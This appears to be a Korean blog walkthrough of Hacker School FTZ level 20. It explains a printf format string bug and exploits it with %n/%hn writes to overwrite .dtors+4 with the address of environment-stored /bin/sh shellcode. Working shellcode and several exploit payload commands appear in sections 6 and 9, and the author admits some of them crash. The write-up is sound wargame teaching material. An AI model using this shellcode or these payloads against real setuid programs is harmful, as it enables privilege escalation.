---
layout: post
title: "Hacker School FTZ - Level 20"
description: "Do you know the ?"
comments: true
categories: [FTZ]
tags: [FTZ]
---

<img data-action="zoom" src='{{ "assets/ftz/level20/1.jpg" | relative_url }}' alt='relative'>  

## 1) level20/we are just regular guys 입력해 로그인  

``` c 
#include <stdio.h>
main(int argc,char **argv)
{ char bleh[80];
  setreuid(3101,3101);
  fgets(bleh,79,stdin);
  printf(bleh);
}
```
 
<img data-action="zoom" src='{{ "assets/ftz/level20/2.png" | relative_url }}' alt='relative'>  

배열의 크기가 80인데 입력을 79 바이트만 받아드립니다. 앞서 풀었던 문제처럼 단순히 배열을 넘어서는 문자열을 입력하여 bof를 일으킬 수 없는 문제입니다.  
그런데 printf 함수에서 문자열 배열을 출력하는 인자가 일반적이지 않습니다.  

printf("%s\n", bleh); 이런식으로 변수에 맞는 형식지정자를 같이 사용하는 데,  
이 문제에서는 형식지정자 없이 변수 이름만 인자로 넘겨줍니다.  

이처럼 문자열 배열을 출력할 때 형식지정자를 따로 지정해주지 않을 경우 <span style="font-size:1.5em; color:#DF0101;">포맷 스트링 공격</span>에 취약합니다.  

## 2) 포맷 스트링 공격이란?  

printf 함수처럼 포맷 스트링을 사용하는 함수는 형식 인자(%d, %x, %c, %s, ...)를 함수의 인자로 인식합니다.  
그래서 bleh 문자열 배열에 담긴 문자열을 출력하기 위해 일반적으로 아래와 같은 코드를 작성합니다.  

``` c
// 출력 타입이 문자열(%s)임을 printf 함수에 인자(형식지정자)로 알려줌
printf("%s\n", bleh);
```

그러나 형식 지정자가 없어도 문제 없이 bleh에 저장된 문자열을 그대로 출력합니다.  

<img data-action="zoom" src='{{ "assets/ftz/level20/3.png" | relative_url }}' alt='relative'>  


만약에 bleh  문자열 배열에 형식 지정자가 포함되어 있으면 어떻게 될까요?  

<img data-action="zoom" src='{{ "assets/ftz/level20/4.png" | relative_url }}' alt='relative'>  

bleh 문자열 내에 포맷 스트링(형식 지정자)이 있으면 메모리(스택)를 읽을 수 있습니다.  

이는 printf 함수가 bleh에 포함되어 있는 "%d"를 문자열이 아닌 (1)형식 지정자를 포함한 포맷 스트링으로 인식하고, (2)출력을 위해 지정된 변수와는 상관없이 스택에서 <span style="color:#DF0101;">4byte</span> 만큼을 pop하여 출력하기 때문에 출력하려는 문자열 내에 '%d', '%x'와 같은 문자가 들어있으면 형식 지시자의 수만큼 메모리(스택)에 저장된 값들이 추출됩니다.  

반면에 형식 지시자 중에는 메모리에 값을 입력할 수 있는 것도 있습니다.  
바로 '%n', '%hn' 입니다.  

%n은 지금까지 출력한 바이트의 수를 메모리에 입력합니다. 즉, %n이 사용되기 직전에 사용된 형식에서 출력된 문자들의 개수가 다음 변수에 저장됩니다.  

<span style="font-size:1.5em; color:#9F81F7;">%n이나 %hn을 사용하면 RET에 쉘코드의 주소를 입력할 수 있지 않을까요?</span>  

## 3) attackme 프로그램의 스택 구조 살펴보기  

attackme 프로그램을 gdb로 디버깅하기엔 권한이 없어 hint에 나와있는 코드를 긁어 tmp 디렉토리에 프로그램 하나를 만들었습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level20/5.png" | relative_url }}' alt='relative'>  


<img data-action="zoom" src='{{ "assets/ftz/level20/6.png" | relative_url }}' alt='relative'>  

<main+67>(0x080483fb)까지 실행됐을 때 스택에는 아래 그림과 같이 데이터가 저장되어 있습니다.  


<img data-action="zoom" src='{{ "assets/ftz/level20/7.png" | relative_url }}' alt='relative'>  


<img data-action="zoom" src='{{ "assets/ftz/level20/8.png" | relative_url }}' alt='relative'>  

생성한 프로그램을 실행하여 'AAAABBBBCCCCDDDD%d%x%x%x%x%x' 문자열을 입력하니,  
스택에 저장된 값들이 0x4f(=79), stdin, ..., bleh 순으로 차례대로 출력되는 것을 확인할 수 있습니다.  

그러면 왜 제일 앞에 있는 bleh 배열의 주소가 출력되는 게 아니라 0x4f(=79) 값이 출력되는 걸까요?  
바로 포맷 스트링 포인터가 가리키는 주소 다음에 위치한 내용이 pop되기 때문입니다. 따라서 스택 상에서 포맷 스트링 포인터 다음에 위치한 내용인 0x4f(=79)가 출력됩니다.  

스택에 저장된 값이 출력되는 것은 확인했습니다. 그렇다면 스택에 데이터를 어떻게 입력할 수 있을까요?  

## 4) 스택에 %n 형식 지시자로 값을 넣는 방법은?  

%n과 %hn 형식 지시자는 %n/%hn 이전까지 쓴 문자열의 바이트 수를 메모리에 입력합니다.  
%n과 %hn의 차이는 데이터를 입력하는 크기 차이입니다. %n은 int형 포인터이고, %hn은 short형 포인터입니다.  
즉, %n으로 값을 입력하면 4바이트씩 값이 입력되고, %hn으로 값을 입력하면 2바이트씩 값이 입력됩니다.  

<img data-action="zoom" src='{{ "assets/ftz/level20/9.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level20/10.png" | relative_url }}' alt='relative'>  

초기에는 num 변수에 0xffffffff 값이 들어있지만 %n 또는 %hn 형식 지시자를 사용하여 %n, %hn 사용되기 직전까지의 문자열 길이 즉, AAAA 문자열의 길이(=4)를 num 변수에 저장했습니다.  

%n의 경우 4바이트 값이 입력되어 0x00000004 값이 저장되었고, %hn의 경우 2바이트 값이 입력되어 0x0004 값이 저장되었습니다.   

## 5) printf 함수 동작 과정  

<img data-action="zoom" src='{{ "assets/ftz/level20/11.png" | relative_url }}' alt='relative'>  

``` c
printf(bleh);  # 0 line
```

위 소스코드에 대한 어셈블리어 코드가 입니다.  
어셈블리어 코드를 보면 eax 레지스터에 bleh 배열의 주소를 넣고 eax에 들어있는 값(=bleh 배열의 주소)을 스택에 올립니다.  

그러면 아래 소스코드에 대한 어셈블리어 코드는 printf 함수 사용을 위해 레지스터와 스택에 어떤 값을 저장할까요?  

``` c
printf("BEFORE: num is 0x%x\n", num);  # 1 line
printf("AAAA%n\n", &num);			   # 2 line
printf("AFTER : num is 0x%x\n", num);  # 3 line
```

<img data-action="zoom" src='{{ "assets/ftz/level20/12.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level20/13.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level20/14.png" | relative_url }}' alt='relative'>  

1, \3 line에서는 형식 지시자를 사용한 문자열을 출력하기 위해 num 변수의 값과 형식 지시자가 포함된 문자열을 스택에 차례대로 쌓았습니다.  
반면에, \2 line에서는 num 변수의 주소와 형식 지시자가 포함된 문자열을 스택에 차례대로 쌓았습니다.  

위의 어셈블리어 코드는 printf 함수를 사용하기 위한 인자 값을 스택에 쌓는 과정입니다.  
printf 함수가 스택에 쌓인 인자들을 어떻게 사용하는지 확인하기 위해 printf 함수의 어셈블리어 코드를 확인해보았습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level20/15.png" | relative_url }}' alt='relative'>  

<printf+9>, <printf+12>에 해당하는 어셈블리어 코드를 보니 eax 레지스터에는 $ebp+8 주소에 위치한 값(문자열의 시작 주소)이 저장되고, edx 레지스터에는 $ebp+12 주소에 위치한 값(num 변수의 값 또는 num 변수의 주소)이 저장됩니다.  

<img data-action="zoom" src='{{ "assets/ftz/level20/16.png" | relative_url }}' alt='relative'>  

printf 함수 실행 전 스택에 값이 쌓이는 순서(바로 위 그림)와 printf 함수 내부 어셈블리어 코드를 설명하는 printf 함수의 동작 과정을 살펴보면 
<span style="background-color:#F7FE2E;">"주소(addr)"+"문자열"+"%n" 이렇게 한 문자열로 나열되어 있을 때 addr 주소에 addr 길이(4byte) + 문자열 길이만큼 addr 주소가 가리키는 공간에 저장됩니다.</span>  


## 6) 환경변수에 쉘코드 입력하기 & 쉘코드가 저장된 주소 확인하기  

우선 쉘코드를 환경변수에 입력하겠습니다.  
 
``` bash
export EGG=`python -c 'print "\x90"*30+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*30'`
```

``` bash
echo 'int main() { printf("ADDR -> %p\n", getenv("EGG")); }' > getenv.c
```

``` bash
gcc -o getenv getenv.c
```

``` bash
./getenv
```

<img data-action="zoom" src='{{ "assets/ftz/level20/17.png" | relative_url }}' alt='relative'>  

쉘코드가 저장된 위치는 <span style="background-color:#BEF781;">0xbffffc5c(\x5c\xfc\xff\xbf)</span> 입니다.  
RET에 해당 주소를 넣어주면 됩니다.  

## 7) %n으로 0xbffffc5c 주소 입력하기! 그러면 RET이 위치하는 주소는 ?!  

앞서 특정 주소가 가리키는 위치에 원하는 값을 입력할 수 있다는 것을 확인했습니다.  
RET에 쉘코드가 저장된 주소를 입력하기 위해선 가장 먼저 RET이 스택 어느 주소에 위치하는지 확인해야 합니다.  

그래야 RET이 위치한 주소에 쉘코드가 저장된 주소를 입력해줄 수 있습니다.  

어? 그런데 문제가 있습니다. 프로그램이 실행될때마다 주소가 변경되어 RET 주소를 특정할 수 없습니다.  
이런 경우 어떻게 해야 할까요? <span style="background-color:#F7FE2E;">바로 dtors 주소를 이용하면 됩니다.</span>  

## 8) RET 말고 dtors는 뭐야?!  

GNU 컴파일러는 소스코드를 컴파일하면 .ctors(constructor)와 .dtors(destructor) 라는 2개의 세그먼트를 생성합니다.  
.ctors는 main 함수가 실행되기 전 실행되는 프롤로그 같은 역할을 수행하고, .dtors는 main 함수가 종료된 후 실행되는 에필로그 같은 역할을 수행합니다.  

포맷 스트링 공격에서 main 함수가 종료된 후에 .dtors가 실행되는 것을 악용해 .dtors를 쉘코드가 저장되어 있는 주소 값으로 덮어 씌워 쉘코드가 실행되도록 합니다.  

attackme 프로그램에서 .dtors가 위치한 주소를 확인해보니 0x08049594에 위치해 있습니다.  

``` bash
objdump -h attackme | grep .dtors
objdump -s -j .dtors attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level20/18.png" | relative_url }}' alt='relative'>  

그러면 0x08049594에 쉘코드가 저장된 주소를 덮어쓰면 될까요? 답은 그렇지 않습니다.  

프로그램에서 dtors를 따로 호출하지 않았다면 dtors+4에 저장되어 있는 값은 0입니다.  

<img data-action="zoom" src='{{ "assets/ftz/level20/19.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level20/20.png" | relative_url }}' alt='relative'>  


만약 dtors+4에 있는 메모리 주소 값이 0이 아닌 경우 dtors+4에 위치한 주소로 찾아가 함수로 실행시킵니다.  
따라서 dtors 시작 위치에 쉘코드 저장 위치를 덮어쓰는 것이 아니라 dtors+4 위치에 덮어써야 합니다.  

attackme 프로그램의 경우 dtors 시작 위치가 0x08049594이므로 쉘코드가 저장될 위치는 0x08049598 입니다.  

## 9) 공격 페이로드 만들기  

<img data-action="zoom" src='{{ "assets/ftz/level20/21.png" | relative_url }}' alt='relative'>  

%n을 사용해 0xbffffc5c(=3,221,224,540)을 한 번에 입력하고 싶어도 x86 시스템(32비트)에 저장할 수 있는 정수 값의 범위는 0부터 4,294,967,295, 또는 −2,147,483,648부터 2,147,483,647까지입니다.  
시스템에서 저장할 수 있는 정수 값 범위 내에서 주소 값을 입력하기 위해 0xbffffc5c 주소를 나눠서 입력하겠습니다.  

### (1) 1 바이트씩 입력  

- dtors+4 주소(0x08049598): \x98\x95\x04\x08, \x99\x95\x04\x08, \x9a\x95\x04\x08, \x9b\x95\x04\x08 (1 바이트씩)  

- 쉘코드 저장된 환경변수 주소(0xbffffc5c): 0x5c(=92)\*, 0xfc-0x5c(=160), 0xff-0xfc(=3), 0x1bf-0xff(=192)\*\*  

\* 0x5c(=92)에서 44(28 byte + 16 byte)을 빼야 합니다.  

\*\* 0xbf가 아니고 0x1bf인 이유: 앞 부분에 작성된 바이트 수만큼 메모리에 입력하는 %n 또는 %hn 형식지정자의 특징 때문입니다.  


<img data-action="zoom" src='{{ "assets/ftz/level20/22.png" | relative_url }}' alt='relative'>  

``` bash
(python -c 'print "\x98\x95\x04\x08"+"AAAA"+"\x99\x95\x04\x08"+"AAAA"+"\x9a\x95\x04\x08"+"AAAA"+"\x9b\x95\x04\x08"+"%8x%8x"+"%48x%n"+"%160x%n"+"%3x%n"+"%192x%n"'; cat) | ./attackme
```

왜 Segmentation fault가 뜰까요,,,?  
이유를 아신다면 알려주세요...  

### (2) 1 바이트씩 주소에 직접 접근하여 입력  

주소에 직접 접근하기 위해 달러 기호($)를 사용하면 됩니다.  
예를 들어 "%7\$n"은 7번째 메모리 주소에 직접 접급한다는 의미입니다.  

- dtors+4 주소: 0x08049598(\x98\x95\x04\x08)  
"\x98\x95\x04\x08"+"\x99\x95\x04\x08"+"\x9a\x95\x04\x08"+"\x9b\x95\x04\x08"+  

- 쉘코드가 저장된 주소: 0xbffffc5c(\x5c\xfc\xff\xbf)  
(1-byte) 0x5c - 0x10(4 바이트 \* 4; dtors+4 주소) = 0x4c(=76)  
페이로드 맨 앞에 오는 4개의 주소가 나열된 문자열의 길이를 빼주면 92-16=76  
"%76x"+"%4\$n"+  

(2-byte) 0xfc - 0x5c = 0xa0(=160)  
"%160x"+"%5\$n"+  

(3-byte) 0xff - 0xfc = 0x3(=3)  
"%3x"+"%6\$n"+  

(4-byte) 0xbf - 0xff = ...?!  
0x1bf - 0xff = 0xc0(=192)
"%192x"+"%7\$n"  

3-byte에 입력한 값보다 4-byte에 입력할 값이 작아 4-byte 위치에 값을 넣을 때 문제가 생깁니다.  

입력할 주소(쉘코드가 저장된 주소)의 바이트 값이 1-byte에서 3-byte와 같이 점점 커지면 커진 수만큼 더해주면 되지만 4-byte와 같이 이전 byte보다 작으면 값을 뺄 수 없습니다.  
0xff 값에서 0xbf 값으로 바꾸기 위해 값을 뺄 수 없으니, 4-byte에 입력할 값에 0x100을 더합니다.  

위의 문제를 예시로 들면, 0x1bf - 0xff로 구한 값을 4-byte에 입력해주면 됩니다.  

``` bash
(python -c 'print "\x98\x95\x04\x08"+"\x99\x95\x04\x08"+"\x9a\x95\x04\x08"+"\x9b\x95\x04\x08"+"%76x"+"%4$n"+"%160x"+"%5$n"+"%3x"+"%6$n"+"%192x"+"%7$n"'; cat) | ./attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level20/23.png" | relative_url }}' alt='relative'>  

다만, 해당 방법은 다른 변수의 값이 변경되는 문제가 발생할 수 있습니다.  

왜 Segmentation fault가 뜰까요,,,?  
이유를 아신다면 알려주세요 (2)...  

### (3) 2 바이트씩 입력 (쇼트 쓰기 기법) 

스택에는 dtors+4 주소를 적어주고 %n 또는 %hn으로 입력할 바이트 값은 쉘코드가 적혀있는 환경변수 주소를 계산해 적어주면 됩니다.  

- dtors+4 주소(0x08049598): \x98\x95\x04\x08, \x9a\x95\x04\x08 (2 바이트씩)  

- 쉘코드 저장된 환경변수 주소(0xbffffc5c): 0xfc5c(=64,604), 0x1bfff-0xfc5c(=50,083)  


``` bash
(python -c 'print "AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08"+"%8x%8x%8x"+"%64564x%hn"+"%50083x%hn"'; cat) | ./attackme
```

``` bash
(python -c 'print "\x98\x95\x04\x08AAAA\x9a\x95\x04\x08"+"%8x%8x"+"%64576x%hn"+"%50083x%hn"'; cat) | ./attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level20/24.png" | relative_url }}' alt='relative'>  

### (4) 2 바이트씩 주소에 직접 접근하여 입력  

``` bash
(python -c 'print "\x98\x95\x04\x08"+"\x9a\x95\x04\x08"+"%64596x"+"%4$hn"+"%50083x"+"%5$hn"'; cat) | ./attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level20/25.png" | relative_url }}' alt='relative'>  

## 10) CLEAR  

<img data-action="zoom" src='{{ "assets/ftz/level20/26.png" | relative_url }}' alt='relative'>  